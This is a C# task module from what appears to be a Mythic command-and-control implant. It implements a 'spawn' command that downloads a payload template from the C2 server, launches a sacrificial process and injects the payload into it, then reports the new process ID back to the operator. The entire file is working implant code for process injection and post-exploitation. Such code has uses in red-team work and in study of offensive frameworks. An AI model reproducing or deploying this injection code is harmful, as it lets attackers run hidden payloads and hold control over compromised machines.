﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define SPAWN
#endif

#if SPAWN

using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.Serialization;

namespace Tasks
{
    public class spawn : Tasking
    {
        [DataContract]
        internal struct SpawnParameters
        {
            [DataMember(Name = "template")]
            public string Template;
        }
        public spawn(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            SpawnParameters parameters = _dataSerializer.Deserialize<SpawnParameters>(_data.Parameters);
            if (_agent.GetFileManager().GetFile(
                    _stopToken.Token,
                    _data.ID,
                    parameters.Template,
                    out byte[] fileBytes))
            {
                var startupArgs = _agent.GetProcessManager().GetStartupInfo();
                var proc = _agent.GetProcessManager().NewProcess(startupArgs.Application, startupArgs.Arguments, true);
                if (proc.Start())
                {
                    if (proc.Inject(fileBytes))
                    {
                        resp = CreateTaskResponse($"Successfully injected into {startupArgs.Application} ({proc.PID})", true);
                    }
                    else
                    {
                        resp = CreateTaskResponse("Failed to inject into sacrificial process.", true, "error");
                    }
                }
                else
                {
                    resp = CreateTaskResponse("Failed to start sacrificial process.", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse("Failed to fetch file.", true, "error");
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif